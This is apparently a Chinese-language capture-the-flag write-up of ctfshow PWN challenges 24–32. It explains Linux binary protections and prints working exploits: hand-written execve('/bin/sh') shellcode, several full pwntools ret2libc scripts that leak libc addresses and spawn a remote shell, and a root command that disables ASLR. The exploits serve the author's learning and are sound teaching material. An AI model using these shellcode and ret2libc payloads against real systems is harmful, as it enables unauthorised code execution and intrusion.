系统中的可执行文件、共享库等 ）文件交互，获取这些符号信息，例如 elf = ELF('./target_binary') 可以加载目标二进制文件，然后通过 elf.symbols['main'] 获取 main 函数的地址。 密码学相关辅助 在 CTF 中，有时会涉及密码学题目，pwntools 也提供了一些基础的密码学辅助功能，比如常见加密算法的简单实现、编码解码等。\n多线程和异步支持 pwntools 一定程度上支持多线程和异步操作，这在同时与多个目标程序交互，或者需要在等待程序输出的同时执行其他任务时非常有用。\n所以为啥要学Python，当然能用豆包、DeepSeek之类的AI帮你写代码exp，但你得先了解Python再让它写才对的，有时会出错，你得有判断力。\n这里推荐使用Pycharm、Visual Studio Code；或者你可以在Kali上用终端来运行，这样你在Kali用nc连接靶机时在同一系统运行交互比较方便，当然Pycharm、Visual Studio Code也有终端功能，只不过要配PWN环境稍微麻烦而已，看你习不习惯用Linux系统吧。\n题目后续： 讲得比较啰嗦，这里开始分析这段汇编代码（重新粘贴了一遍，和上面一样）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 .text:080484C6 ; =============== S U B R O U T I N E ======================================= .text:080484C6 .text:080484C6 ; Attributes: bp-based frame .text:080484C6 .text:080484C6 ; int __cdecl ctfshow(_DWORD) .text:080484C6 public ctfshow .text:080484C6 ctfshow proc near ; CODE XREF: main+132↓p .text:080484C6 .text:080484C6 buf = byte ptr -88h .text:080484C6 var_4 = dword ptr -4 .text:080484C6 .text:080484C6 ; __unwind { .text:080484C6 push ebp .text:080484C7 mov ebp, esp .text:080484C9 push ebx .text:080484CA sub esp, 84h .text:080484D0 call __x86_get_pc_thunk_bx .text:080484D5 add ebx, (offset _GLOBAL_OFFSET_TABLE_ - $) .text:080484DB sub esp, 4 .text:080484DE push 100h ; nbytes .text:080484E3 lea eax, [ebp+buf] .text:080484E9 push eax ; buf .text:080484EA push 0 ; fd .text:080484EC call _read .text:080484F1 add esp, 10h .text:080484F4 sub esp, 0Ch .text:080484F7 lea eax, [ebp+buf] .text:080484FD push eax ; s .text:080484FE call _puts .text:08048503 add esp, 10h .text:08048506 lea eax, [ebp+buf] .text:0804850C call eax .text:0804850E nop .text:0804850F mov ebx, [ebp+var_4] .text:08048512 leave .text:08048513 retn .text:08048513 ; } // starts at 80484C6 .text:08048513 ctfshow endp .text:08048513 .text:08048514 .text:08048514 ; =============== S U B R O U T I N E ======================================= 这代码是在看不懂可以上AI嗦一下，让它帮你解析一下，毕竟刚入门\u0026hellip;\u0026hellip;（这段代码是 IDA 反编译出的 32 位 x86 架构程序中ctfshow函数）\nchecksec一下：记住上面的参数，后面写exp要用\u0026hellip;\n可知，对这些保护有点遗忘的可以回去看PWN-1的Linux安全保护机制\n保护项 状态 对利用的影响 Arch i386-32-Little 32 位 x86 架构，shellcode 需用 32 位版本（对应shellcraft.i386.sh()） Canary（栈溢出保护） No canary found 无栈溢出保护，缓冲区溢出后可直接覆盖栈上数据（无需绕过 canary） NX（栈不可执行） NX disabled 栈段可执行，shellcode 直接放在栈上就能运行（无需 ROP 绕过 NX） PIE（地址随机化） No PIE (0x8048000) 程序地址固定，ctfshow函数、buf缓冲区地址不会变（无需泄露地址） RWX segments Has RWX segments 存在 “可读可写可执行” 的内存段，进一步确保 shellcode 能正常执行 总结：程序保护机制极弱，直接用 “栈溢出注入 shellcode” 即可，无需复杂绕过。\n回到本题目，在nc连接之后交互一会发现并无实际效果，PWN大致思路是找到后门函数或者系统调用函数进行提权，提权之后就进行交互去执行一些靶机的终端命令例如：cat ctfshow_flag、ls之类的。那在此之前都得先找到这“后门”，也就是/bin/sh、zsh、system函数等等，但我发现这个程序并无这些地址存在，所以说这个程序从被制造出来都没想过要执行这些有关提权的代码\u0026hellip;..\n因为NX、canary没开、又有RWX，注入一段我们设计的有关执行/bin/sh的exp还是可以的，大致思路有了，接下来开始执行吧。\n围绕 “直接执行 shellcode” 设计方案\n可以用pwntools的脚本啊，单纯直接调用函数的，而且pwntools有局限啊，就那用这个pwntools的shellcraft模块生成的shellcode比较晦涩难懂，而且注释放到Kali上比较杂乱，而且没有涉及到汇编语言调用，比较简单我就不用了，我这里手敲shellcode方便大家了解一下底层逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * # 导入 pwntools 库 context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为调试模式 #io = process(\u0026#39;./pwn\u0026#39;) # 本地连接 io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28176) # 远程连接 shellcode = asm( \u0026#39;\u0026#39;\u0026#39; mov eax, 0xb mov ecx, 0 mov edx, 0 push 0x0068732f push 0x6e69622f mov ebx, esp int 0x80 \u0026#39;\u0026#39;\u0026#39;) # 生成一个 Shellcode io.sendline(shellcode) # 将生成的 Shellcode 发送到目标 io.interactive() 创建一个python文件，输入这些代码放到终端上运行，记得提前打开另外一个窗口进行nc连接远程靶机。\n上面其它的python代码没啥可讲的，这是远程交互的模板代码，直接套就好，我现在重在讲解这个手搓的shellcode，它和shellcraft模块产生的shellcode效果一样的，而且还好看懂：\n1 2 3 4 5 6 7 8 mov eax, 0xb ; syscall号：11对应execve mov ecx, 0 ; argv参数为NULL mov edx, 0 ; envp参数为NULL push 0x0068732f ; 压栈字符串\u0026#34;/sh\\0\u0026#34;（小端序存储） push 0x6e69622f ; 压栈字符串\u0026#34;/bin\u0026#34;（小端序存储） mov ebx, esp ; ebx指向栈顶的\u0026#34;/bin/sh\u0026#34;字符串地址 int 0x80 ; 触发系统调用 这 7 行代码通过精准设置寄存器和栈数据，完成了execve系统调用的参数准备，最终实现 “用/bin/sh替换当前进程” 的效果，是 CTF 中获取 shell 的基础手段，逻辑清晰且精简（仅 23 字节）。\n逐行解析手敲shellcode 思路：注入一段能执行/bin/sh的汇编语言代码\n① mov eax, 0xb\neax寄存器在 32 位 Linux 系统调用中专门用于传递 “系统调用号”（告诉内核要执行哪个系统调用）。 0xb是十六进制，转换为十进制是11，而11正是execve系统调用对应的编号（内核通过这个值识别要执行execve）。 ② mov ecx, 0\necx寄存器用于传递execve的第二个参数argv（参数列表）。 传0（即NULL）表示 “没有参数”，等价于在命令行直接输入/bin/sh（不带任何参数）。 ③ mov edx, 0\nedx寄存器用于传递execve的第三个参数envp（环境变量列表）。 传0（即NULL）表示 “没有环境变量”，内核会使用默认环境变量。 ④ push 0x0068732f\npush指令将数据压入栈中（栈是向下增长的内存区域）。\n1 0x0068732f 是十六进制的 “小端序” 存储（x86 架构默认小端序，即低地址存低位字节），转换为 ASCII 码：\n0x2f → / 0x73 → s 0x68 → h 0x00 → 字符串结束符\\0 所以这行实际是往栈上压入字符串\u0026quot;/sh\\0\u0026quot;。 ⑤ push 0x6e69622f\n同样是压栈操作，0x6e69622f转换为 ASCII 码：\n0x2f → / 0x62 → b 0x69 → i 0x6e → n 所以这行往栈上压入字符串\u0026quot;/bin\u0026quot;。 结合上一行，栈上现在的内容是\u0026quot;/bin/sh\\0\u0026quot;（因为栈先压入\u0026quot;/bin\u0026quot;，再压入\u0026quot;/sh\\0\u0026quot;，栈顶到栈底的顺序就是/b/i/n//s/h/\\0）。\n⑥ mov ebx, esp\nesp是栈指针寄存器，永远指向当前栈顶的地址。 经过两次push后，栈顶正好是\u0026quot;/bin/sh\\0\u0026quot;字符串的起始地址（第一个字符'/'的位置）。 这行指令将栈顶地址存入ebx，而ebx寄存器在execve系统调用中用于传递第一个参数filename（程序路径），所以ebx现在指向我们要执行的\u0026quot;/bin/sh\u0026quot;。 ⑦ int 0x80\nint是中断指令，0x80是 Linux 系统调用的中断号。 执行这条指令会触发一个软中断，让 CPU 从用户态切换到内核态，内核会根据eax中的系统调用号（11）执行execve，并使用ebx、ecx、edx中的参数。 总之：必须要定义好这几个寄存器，在最底层操作系统运行时都会用到的，这里不详细讲述，反正你知道这几个寄存器一开始就得这么定义就好啦。（不耐烦了）\n1 2 3 mov eax, 0xb mov ecx, 0 mov edx, 0 push压栈时要记得字节限制，因为架构是x32，所以push最多4个字节，也就是push两个：/bin、/sh的地址（不满四个字节如/sh要记得用00填满哦不然会报错）\n然后就是记得esp寄存器是动态的\u0026hellip;\n这是调用pwntools的shellcraft模块的exp：\n1 2 3 4 5 6 7 from pwn import * context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为debug，会输出详细的交互过程 #io = process(\u0026#39;./pwn\u0026#39;) # 本地调试时启用，用于启动本地的pwn程序 io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28183) # 连接远程目标服务，地址为pwn.challenge.ctf.show，端口28183 shellcode = asm(shellcraft.sh()) # 生成一个执行/bin/sh的shellcode io.sendline(shellcode) # 将shellcode发送给目标服务 io.interactive() # 进入交互模式，允许用户与目标服务进行交互（如执行命令） 这是它的shellcode（原版未修改过，直接复制粘贴上来的）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* execve(path=\u0026#39;/bin///sh\u0026#39;, argv=[\u0026#39;sh\u0026#39;], envp=0) */ /* push b\u0026#39;/bin///sh\\x00\u0026#39; */ push 0x68 push 0x732f2f2f push 0x6e69622f mov ebx, esp /* push argument array [\u0026#39;sh\\x00\u0026#39;] */ /* push \u0026#39;sh\\x00\\x00\u0026#39; */ push 0x1010101 xor dword ptr [esp], 0x1016972 xor ecx, ecx push ecx /* null terminate */ push 4 pop ecx add ecx, esp push ecx /* \u0026#39;sh\\x00\u0026#39; */ mov ecx, esp xor edx, edx /* call execve() */ push 11 /* 0xb */ pop eax int 0x80 看着确实比较乱\u0026hellip;..😅\n最后的最后我想对这题做些评价，其实题不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄\n大致思路知道就好，靶机的flag是动态变化的。\nPWN_025 题目：开启NX保护，或许可以试试ret2libc\nPWN_025\n根据题目，也就是说具体攻击手法为：ret2libc\nret2libc攻击 ret2libc 是一种在二进制漏洞利用中的经典技术，全称为 “return - to - libc”，中文可理解为 “返回至 libc 库”，常用于绕过栈不可执行（NX，No - eXecute）保护机制。\nret2libc实现步骤 信息泄漏：通过栈溢出漏洞，结合一些函数（如 write 函数），泄漏出程序中 libc 库函数的真实地址。因为在不同系统中，libc 库加载的基地址是随机的（ASLR 保护机制），但库内函数之间的相对偏移是固定的，所以需要先获取一个已知函数（比如 write ）的真实地址，进而计算出其他函数（如 system ）的地址。 计算关键地址：根据泄漏出的 libc 函数地址，计算出 system 函数地址和 /bin/sh 字符串在内存中的地址。由于 libc 中函数和字符串的相对位置固定，所以可以通过已知函数地址与偏移量来计算其他关键地址。 构造 payload：再次利用栈溢出漏洞，构造合适的 payload。payload 一般包含填充数据（用于填满缓冲区直到覆盖返回地址）、system 函数地址（覆盖返回地址，使程序返回时跳转到 system 函数）、一个无效的返回地址（system 函数执行完后要返回的地址，随便填充一个地址，因为获取到 shell 后通常不会再关注这个返回操作 ）、/bin/sh 字符串的地址（作为 system 函数的参数，这样 system 函数执行时就相当于执行了 system(\u0026quot;/bin/sh\u0026quot;) ，从而打开一个 shell ）。 发送 payload：将构造好的 payload 发送给存在漏洞的程序，使程序按照攻击者期望的流程执行，最终获取到一个交互式 shell，达到漏洞利用的目的。 checksec一下，发现开了NX保护，也就是说不能用shellcode了。\n跟进ctfshow函数：\n可以发现buf大小为 132 字节，但read允许读取 0x100（256）字节存在栈溢出漏洞。\n跟进write函数：\nIDAx32分析，也没有/bin/sh、后门system：\n这时候就需要使用利用libc（动态链接库）的system函数和/bin/sh字符串（这题思路很类似PWN_024的编写shellcode一样，程序本身没有后门可入只能从外部链接进这些函数，从而达到进入交互\u0026hellip;），这些东西在程序运行时的真实地址计算方法为：@got真实地址 = libc基址 + 偏移，所以要先计算出偏移。\n以write函数为例 ，偏移 = 真实地址 - libc基址，真实地址存在write@got、write@got可以通过write@plt来运行这个函数从而泄露出来，libc 版本和基址可以导入 libcSearcher 库来查找计算这里需要去系统学习一下动态链接的过程（有关.got、.plt表的知识），简单画个图说明一下黄色部分是静态的，绿色部分是动态变化的：\nelf.got[\u0026lsquo;write\u0026rsquo;]的作用是获取 write函数真实地址的存储位置，即write@got的地址；\nelf.plt[\u0026lsquo;write\u0026rsquo;]的作用是获取 write函数跳板地址的存储位置，即write@plt的地址；\n具体思路：\n解析目标程序的 ELF 文件，读取write@plt的地址 、write@got的地址和ctfshow的函数地址。 以栈溢出漏洞作为入口，跳转到write@plt执行函数泄露write@got的地址，再跳转回ctfshow函数。 读取泄露出的write@got的地址，用 libcSearcher 库查找正确的 libc 版本，再计算偏移。 计算system函数和/bin/sh字符串的真实地址。 继续从ctfshow函数里的栈溢出作为入口，跳转到system函数真实地址，同时将/bin/sh作为参数传入，从而拿到权限。 这里之前我是跳过的，比较难，我做到PWN_044之后才倒回来做的。\nPWN044 的利用逻辑是 “先调用 gets 向 bss 段写入 /bin/sh，再调用 system 执行”（类似文档中 PWN044 的 gets 调用场景）。此时调用 gets 仅需其 “函数入口” 即可完成数据写入，无需知道 gets 在 libc 中的真实地址 —— 直接使用 gets 的 PLT 表地址（p32(gets) 本质是 p32(gets_plt)），就能触发 gets 执行，实现写入 /bin/sh 的目标。这就是为什么在PWN_044是直接是p32(gets)，而在这调用write函数是要分.got和.plt，因为它俩功能都不同。\nwrite_plt 负责 “触发 write 执行”，write_got 负责 “提供待泄露的真实地址”，二者缺一不可，因此必须明确区分。\n总之：ret2libc 核心逻辑：“泄露地址→计算地址→构造调用”\nexp备注版：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 from pwn import * # 导入pwntools库，提供漏洞利用常用功能（如连接、打包等） from LibcSearcher import * # 导入LibcSearcher，用于根据泄露的函数地址查找对应libc版本 context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为debug，显示详细的交互过程（方便调试） # 建立与目标服务的连接（远程服务器地址和端口） io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28298) # 加载目标二进制文件，获取符号信息（如函数地址、GOT表地址等） elf = ELF(\u0026#39;./pwn\u0026#39;) # 获取main函数的地址（用于第一次溢出后跳回main函数，进行二次攻击） main = elf.sym[\u0026#39;main\u0026#39;] # 获取write函数的GOT表地址（Global Offset Table，存储函数的真实内存地址） write_got = elf.got[\u0026#39;write\u0026#39;] # 获取write函数的PLT表地址（Procedure Linkage Table，用于间接调用函数） write_plt = elf.plt[\u0026#39;write\u0026#39;] # 构造第一次攻击的payload（栈溢出利用） # 1. 填充缓冲区到返回地址：0x88是缓冲区大小，0x4是ebp寄存器大小（32位程序） # 2. 返回地址：覆盖为write@plt（调用write函数输出数据） # 3. write执行完后跳转的地址：main函数（回到程序开头，方便第二次攻击） # 4. write函数的参数1：文件描述符0（错误！应为1，stdout标准输出，否则无法正确泄露数据） # 5. write函数的参数2：要泄露的地址（write@got，存储write的真实内存地址） # 6. write函数的参数3：泄露的字节数（4字节，32位地址长度） payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4) # 发送第一次payload，触发栈溢出，执行write函数泄露地址 io.sendline(payload) # 接收泄露的write函数真实地址（4字节，32位），并转换为整数 write = u32(io.recv(4)) print(hex(write)) # 打印泄露的地址（十六进制） # 使用LibcSearcher根据write函数地址查找对应的libc版本 libc = LibcSearcher(\u0026#39;write\u0026#39;, write) # 计算libc的基地址：libc基地址 = 泄露的函数地址 - 该函数在libc中的偏移量 libc_base = write - libc.dump(\u0026#39;write\u0026#39;) # 计算system函数的地址：system地址 = libc基地址 + system在libc中的偏移量 system = libc_base + libc.dump(\u0026#39;system\u0026#39;) # 计算\u0026#34;/bin/sh\u0026#34;字符串的地址：bin_sh地址 = libc基地址 + 字符串在libc中的偏移量 bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) # 构造第二次攻击的payload（获取shell） # 1. 同样的填充：覆盖缓冲区和ebp # 2. 返回地址：覆盖为system函数地址（调用system执行命令） # 3. system执行完后跳转的地址：main函数（可选，不影响shell使用） # 4. system函数的参数：\u0026#34;/bin/sh\u0026#34;字符串的地址（执行该命令获取交互shell） payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh) # 发送第二次payload，触发栈溢出，执行system(\u0026#34;/bin/sh\u0026#34;) io.sendline(payload) # 进入交互模式，与获取的shell进行交互（输入命令等） io.interactive() 原版exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * from LibcSearcher import * context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;i386\u0026#39;) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28157) elf = ELF(\u0026#39;./pwn\u0026#39;) main = elf.sym[\u0026#39;main\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] payload = cyclic(0x88+4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4) io.sendline(payload) write = u32(io.recv(4)) libc = LibcSearcher(\u0026#39;write\u0026#39;,write) libc_base = write - libc.dump(\u0026#39;write\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x88+4) + p32(system) + p32(main) + p32(bin_sh) io.sendline(payload) io.interactive() 这部分主要涉及到栈溢出的章节知识点，我已经讲解的很详细很啰嗦了，如果看不懂就跳过吧，把栈溢出搞懂后再跳回来做。我当时也是跳过的，之后再回来写wp的。\n感觉强度上来了，做得有点吃力。\nPWN_026 题目：设置好 ASLR 保护参数值即可获得flag。为确保flag正确，本题建议用提供虚拟机运行。 PWN libc-2.27.so （提取码show）\n这题坑到我了，运行程序发现直接爆flag，交上去发现是假的/(ㄒoㄒ)/~~\nIDAx64分析，有system后门函数：\n而且可以知道这个flag是有几个printf、puts共同打印出的、字符串由地址拼接（%p打印指针或者地址，以16进制形式）而成。\n运行一下：\n每次flag都不一样，说明地址一直在变化，也就是地址随机化。\n在Linux保护机制有讲过ASLR，关于ASLR保护可以看回PWN-1：ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置。\ngdb调试一下，题目早给出了2，在这里单纯演示一下；\n1 gdb -q pwn 1 shell cat /proc/sys/kernel/randomize_va_space 虽然 checksec 输出中没有直接的 ASLR 开启状态，但可以结合系统层面的设置（通过 cat/proc/sys/kernel/randomize_va_space 查看，输出 0 表示关闭 ASLR，1 表示部分开启，2 表示完全开启 ）来判断程序运行时的 ASLR 情况。\n既然地址随机化保护，我们就把它关掉（记得提权root）：\n1 echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space 这里有个点就是我的flag是ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}\n但不知为啥和官方不一样flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}\n但我的程序运行了三次，ASRL也关了，flag出来的是一样的，代表地址是真实的，flag没错的。反正大体思路是正确的。\n总之记住：/proc/sys/kernel/randomize_va_space\nPWN_027 题目：设置好 ASLR 保护参数值即可获得flag。libc-2.27.so PWN\n这题也是一样的，”If the result is 0 or 1, then you get the correct flag!“将ASLR保护的数值改成1或0就好。（套上题的公式）\n怪怪的：\n官方flag是ctfshow{0x400687_0x400560_0x603260}\n欸我发现\u0026hellip;.0x603260的后面的6变成a了，有点招笑\u0026hellip;应该是Kali环境和Ubuntu不同，我去网上查了下，发现大部分PWN的WP都是用Ubuntu解的：\n这里的flag就是正常的了。从现在开始我将彻底使用Ubuntu了。\nPWN_028 题目：设置好 ASLR 保护参数值即可获得flag；libc-2.27.so、 PWN （show）\n这题送分的，ASLR直接关的，flag还是地址拼出来的，那flag就不变得就是真的了。不信可以多运行几次，你看flag会变吗？\nflag is :ctfshow{0x400687_0x400560}\nPWN_029 题目：ASLR和PIE开启后；libc-2.27.so、 PWN\n试着ASLR和PIE保护开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是相对偏移是不会变化的。\n1 sysctl -w kernel.randomize_va_space=2 #完全打开ASLR保护 直接运行\u0026hellip;\u0026hellip;\nflag（有点长但是对的\u0026hellip;）：ctfshow{Address_Space_Layout_Randomization\u0026amp;\u0026amp;Position-Independent_Executable_1s_C0000000000l!}\n这题只是让你了解下ASLR和PIE保护的特点，flag不是目的：\nPWN_030 题目：关闭PIE后；程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。 PWN_030\nchecksec一下：没开canary和PIE，开了NX不好用Shellcode。\nIDAx32看一下：\nbuf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 。调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 \u0026amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节，但这char定义buf是132字节，所以存在栈溢出漏洞。\n并无找到后门/bin/sh，通过ret2libc，那从栈溢出下手：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 from pwn import * context.log_level = \u0026#39;debug\u0026#39; # 设置日志级别为debug，显示详细调试信息 context.arch = \u0026#39;i386\u0026#39; # 指定目标程序为32位架构 # 连接远程目标服务器，若本地调试可切换为process io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28121) # io = process(\u0026#39;./pwn\u0026#39;) # 加载目标程序和对应的libc库 elf = ELF(\u0026#39;./pwn\u0026#39;) # 加载漏洞程序 libc = ELF(\u0026#39;/home/ctfshow/libc/32bit/libc-2.27.so\u0026#39;) # 加载对应的libc库 # 获取关键地址 write_plt = elf.sym[\u0026#39;write\u0026#39;] # 从程序符号表获取write函数的PLT地址（用于调用） write_got = elf.got[\u0026#39;write\u0026#39;] # 从程序全局偏移表获取write函数的GOT地址（存储真实地址） ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] # 获取存在栈溢出的ctfshow函数地址（用于二次溢出） offset = 140 # 溢出偏移：缓冲区大小 + EBP长度，通过调试确定 # 构造第一个payload：泄漏write函数的真实地址 payload1 = flat( b\u0026#39;A\u0026#39; * offset, # 填充缓冲区直到覆盖返回地址 p32(write_plt), # 覆盖返回地址为write@plt，调用write函数 p32(ctfshow), # write执行完后跳回ctfshow函数，以便再次接收输入 p32(1), # write函数第1个参数：文件描述符1（标准输出） p32(write_got), # write函数第2个参数：要读取的地址（write的GOT表项） p32(4) # write函数第3个参数：读取字节数（32位地址占4字节） ) # 发送第一个payload，触发write函数泄漏地址 io.send(payload1) # 接收泄漏的write函数真实地址（4字节，32位） write_addr = u32(io.recv(4)) log.success(\u0026#34;write address: %#x\u0026#34; % write_addr) # 打印获取到的write地址 # 计算libc基地址及关键函数地址 libc_base = write_addr - libc.sym[\u0026#39;write\u0026#39;] # libc基地址 = write真实地址 - libc中write的偏移 system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] # system函数地址 = 基地址 + system在libc中的偏移 # /bin/sh字符串地址 = 基地址 + /bin/sh在libc中的偏移 binsh_addr = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) # 打印计算得到的关键地址（调试用） log.success(\u0026#34;libc base: %#x\u0026#34; % libc_base) log.success(\u0026#34;system address: %#x\u0026#34; % system_addr) log.success(\u0026#34;/bin/sh address: %#x\u0026#34; % binsh_addr) # 构造第二个payload：调用system(\u0026#34;/bin/sh\u0026#34;)获取shell payload2 = flat( b\u0026#39;B\u0026#39; * offset, # 再次填充缓冲区到返回地址 p32(system_addr), # 覆盖返回地址为system函数地址 p32(0xdeadbeef), # system执行后的返回地址（随意填充，不影响功能） p32(binsh_addr) # system函数的参数：/bin/sh字符串地址 ) # 发送第二个payload，触发system调用 io.send(payload2) # 进入交互模式，与获取到的shell进行交互 io.interactive() 无备注代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 write_got = elf.got[\u0026#39;write\u0026#39;] ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] offset = 140 payload1 = flat( b\u0026#39;A\u0026#39; * offset, p32(write_plt), p32(ctfshow), p32(1), p32(write_got), p32(4) ) io.send(payload1) write_addr = u32(io.recv(4)) log.success(\u0026#34;write address: %#x\u0026#34; % write_addr) libc_base = write_addr - libc.sym[\u0026#39;write\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) log.success(\u0026#34;libc base: %#x\u0026#34; % libc_base) log.success(\u0026#34;system address: %#x\u0026#34; % system_addr) log.success(\u0026#34;/bin/sh address: %#x\u0026#34; % binsh_addr) payload2 = flat( b\u0026#39;B\u0026#39; * offset, p32(system_addr), p32(0xdeadbeef), p32(binsh_addr) ) io.send(payload2) io.interactive() 需要注意的点：\n1 2 3 4 # 获取关键地址 write_plt = elf.sym[\u0026#39;write\u0026#39;] # 从程序符号表获取write函数的PLT地址（用于调用） write_got = elf.got[\u0026#39;write\u0026#39;] # 从程序全局偏移表获取write函数的GOT地址（存储真实地址） ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] # 获取存在栈溢出的ctfshow函数地址（用于二次溢出） 这里的地址是可以手写的，但我不建议，AI给的是确切地址，这里我给改了，下次AI写脚本，地址一定不要手动硬写出来，帮AI改一下改成自动获取的，比如上面这样，系统会自动获取地址的，这样比较准确不会出错崩溃。\n说实话，给我肯定写不到的，不熟悉编写python远程交互脚本，但我可以读懂，我可以用AI帮我写代码，我就把意愿告诉它，把IDA汇编代码以及跟进的函数复制发给它，附上我的思路，不如已经知道是利用栈溢出漏洞编写ret2libc、知道开启了哪些保护、一步步修改得到的。\nPWN_031（待定） 题目：开启 ASLR 和 PIE 的情况下，仍可能被利用； PWN_031\nchecksec一下，无栈保护：\n跟进ctfshow函数：\n发现同样的代码，有溢出，似乎可用上题的exp，不过checksec看到的保护是不一样的，exp肯定不一样了\u0026hellip;.\n运行之后莫名其妙，会有报随机化的地址：\n\u0026hellip;..深入分析CTFshow-PWN入门-pwn31的解法与原理 - Claire_cat - 博客园\n这题和PWN_025差不多，有关栈溢出的知识点，这里先跳\u0026hellip;\nFORTIFY缓冲区边界检查 FORTIFY_SOURCE 是 GCC 提供的一种轻量级缓冲区溢出保护机制，通过对危险函数（如 strcpy、memcpy 等）进行增强检查，降低缓冲区溢出漏洞的利用风险。它有 3 个级别：_FORTIFY_SOURCE=0（关闭）、_FORTIFY_SOURCE=1（基础保护）、_FORTIFY_SOURCE=2（强化保护），各级别区别如下：\n级别 启用条件 核心检查逻辑 防护范围 性能影响 0 默认（无需定义宏） 无任何检查，使用原始函数 无 无 1 -D_FORTIFY_SOURCE=1 -O1 检查 “源长度 \u0026lt; 目标缓冲区长度”（仅限编译期可知） 部分静态场景 极小 2 -D_FORTIFY_SOURCE=2 -O2 检查 “操作长度 ≤ 目标缓冲区实际大小”（含运行时） 静态 + 动态场景，覆盖更多函数 轻微 FORTIFY_SOURCE 仅能防护部分已知的危险函数，无法替代 NX、Stack Canary 等更全面的保护机制。 必须配合优化选项（-O1/-O2）才能生效，否则编译器会忽略该宏定义。 对于动态分配的内存（如 malloc 分配的缓冲区），FORTIFY_SOURCE 无法获取其大小，因此无法防护相关操作（如 memcpy(malloc_buf, src, n)）。 PWN_032 题目：FORTIFY_SOURCE=0：\n禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。\n这题主要是在函数逻辑运行，知道运行的原理就好。\nIDA分析main：\n跟进undefined函数：\n可以看到，关键在于成功进入到undefined函数才有机会下一步获得flag：\n从main函数出发：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 __fastcall main(int argc, const char **argv, const char **envp) { __gid_t v3; // eax const char *v4; // rax int v5; // eax int num; // [rsp+4h] [rbp-44h] BYREF char buf2[11]; // [rsp+Ah] [rbp-3Eh] BYREF char buf1[11]; // [rsp+15h] [rbp-33h] BYREF v3 = getegid(); setresgid(v3, v3, v3); logo(); v4 = argv[1]; *(_QWORD *)buf1 = *(_QWORD *)v4;//指针 *(_WORD *)\u0026amp;buf1[8] = *((_WORD *)v4 + 4);//指针 buf1[10] = v4[10]; strcpy(buf2, \u0026#34;CTFshowPWN\u0026#34;); printf(\u0026#34;%s %s\\n\u0026#34;, buf1, buf2); v5 = strtol(argv[3], 0LL, 10); memcpy(buf1, argv[2], v5); strcpy(buf2, argv[1]); printf(\u0026#34;%s %s\\n\u0026#34;, buf1, buf2); fgets(buf1, 11, _bss_start); printf(buf1, \u0026amp;num); if ( argc \u0026gt; 4 ) Undefined(); return 0; } 大致是：起初先打印ctfshow的logo信息（其实一开始那个v3把我搞懵了，其实对解题过程没啥帮助的），在最顶端的__fastcall 